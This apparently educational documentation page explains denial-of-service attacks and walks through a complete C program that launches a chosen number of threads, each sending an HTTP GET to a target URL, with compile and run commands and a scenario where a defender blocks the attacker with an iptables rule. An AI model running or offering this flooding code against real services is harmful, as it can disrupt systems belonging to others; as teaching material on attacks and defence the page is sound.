---
sidebar_position: 5
---

# DDOS Attack

Denial of Service (DoS) attack is a malicious attempt to overwhelm a web property with traffic in order to disrupt it's normal operations. A Distributed Denial of Service (DDOS) is the same attack, done by multiple machines at the same time.

Sometimes, DDOS attack can happen accidentally, for example when multiple machines send request to the same API at the same time and the API cannot handle it.

> [More info on DDOS here!](https://www.cloudflare.com/learning/ddos/glossary/denial-of-service/)

This attack can easily be simulated by a simple C script with threads. Each thread correspond to a machine connected to the network the attacker is using.

## Script

First let's establish a simple C program, with the libraries that are gonna be used!

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h> // Used for the threads
#include <curl/curl.h> // Used for the HTTP GET request

int main(int argc, char **argv) {
  if (argc != 3) {
    printf("The correct way to use the simulator is: ./ddos url num_of_attackers\n");
    exit(1);
  }
}
```

Next, it's needed to make a thread function to pass data to and write the methodical initializations of the threads to the main function.

To do that, a struct named ``thread_args`` is gonna be declared in the same file.

### Threads

```c
typedef struct thread_args {
  const char *url;
} thread_args;
```

This keeps only one string variable that holds the url that is gonna be attacked. Back in the main function, it's gonna be used like this:

```c
// Arguments to take to the function
thread_args *args = malloc(sizeof(thread_args));
args->url = argv[1];

// Thread initializer
pthread_t *p_thread;
p_thread = (pthread_t *)malloc(sizeof(pthread_t) * length);

// Start of thread
for (int i = 0; i < length; i++) {
  pthread_create(&p_thread[i] ,NULL, ddos, args);
}

// Thread join
for (int i = 0; i < length; i++) {
  pthread_join(p_thread[i],NULL);
}

// Clearing the buffer
free(p_thread);
pthread_exit(NULL);
```

This creates X threads, which X is gonna be given by the user on the program initialization. In the end, it runs the function on each core and when it's done, it just frees the memory and finishes the program.

### DDOS Function

The DDOS function runs like how CURL runs on a unix-based system, it sends a GET request to the URL it gets from the main program and it finishes if it's successful.

```c
void *ddos(void *_args) {
  // Parse arguments from main thread to X thread.
  thread_args *args = (thread_args *) _args;

  // Curl init
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Set attack
    curl_easy_setopt(curl, CURLOPT_URL, args->url);

    // Perform attack
    res = curl_easy_perform(curl);

    // If attack was successful, it skips this if
    if (res != CURLE_OK) {
      fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    // Clean the CURL buffer
    curl_easy_cleanup(curl);
  }

  return NULL;
}
```

> [The original implementation can be found here!](https://curl.se/libcurl/c/https.html)

### Complete code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <curl/curl.h>

// A simple struct to send data from the main thread to the X thread
typedef struct thread_args {
  const char *url;
} thread_args;

// Thread function
void *ddos(void *_args) {
  // Parse arguments from main thread to X thread.
  thread_args *args = (thread_args *) _args;

  // Curl init
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Set attack
    curl_easy_setopt(curl, CURLOPT_URL, args->url);

    // Perform attack
    res = curl_easy_perform(curl);

    // If attack was successful, it skips this if
    if (res != CURLE_OK) {
      fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    // Clean the CURL buffer
    curl_easy_cleanup(curl);
  }

  return NULL;
}

int main(int argc, char **argv) {
  if (argc != 3) {
    printf("The correct way to use the simulator is: ./ddos url num_of_attackers\n");
    exit(1);
  }

  unsigned int length = atoi(argv[2]); // Length of thread array

  // Arguments to take to the function
  thread_args *args = malloc(sizeof(thread_args));
  args->url = argv[1];

  // Thread initializer
  pthread_t *p_thread;
  p_thread = (pthread_t *)malloc(sizeof(pthread_t) * length);

  // Start of thread
  for (int i = 0; i < length; i++) {
    pthread_create(&p_thread[i] ,NULL, ddos, args);
  }

  // Thread join
  for (int i = 0; i < length; i++) {
    pthread_join(p_thread[i],NULL);
  }

  // Clearing the buffer
  free(p_thread);
  pthread_exit(NULL);
}
```

## How to compile and run

The command to compile the program is:

```bash
gcc -o ddos ddos.c -lcurl -pthread
```

However, simply typing ``make`` in the program root automatically compiles it if ``gcc`` or ``make`` is in the system.

To simply run it, use ``./ddos url num_of_attackers``, where ``url`` is the URL that is attacked and ``num_of_attackers`` is the number of machines that attack the API.

### Attack simulation

Let's imagine that the attacker uses 30 machines at his disposal and it attacks the middleware API.

The attacker uses ``netstat`` and ``nmap`` to scan the machine and find that the port ``8351`` is used and he runs the script by typing in the terminal: ``./ddos middleware:8351 30``.

The defender notices quickly (either with ``tcpdump`` or ``wireshark``) that something shady happens and decides to quickly cut access to the attacker. Let's assume that the attackers IP is ``100.32.64.12``.

The defender uses ``iptables`` to block the access to the attacker. The full command is:

```bash
iptables -A INPUT -s 100.32.64.12 -j DROP
```

The attacker thinks he was victorious and he tries to attack again. However, this time, instead of attacking, he gets the message ``Hostname is unreachable`` and he is utterly beaten.
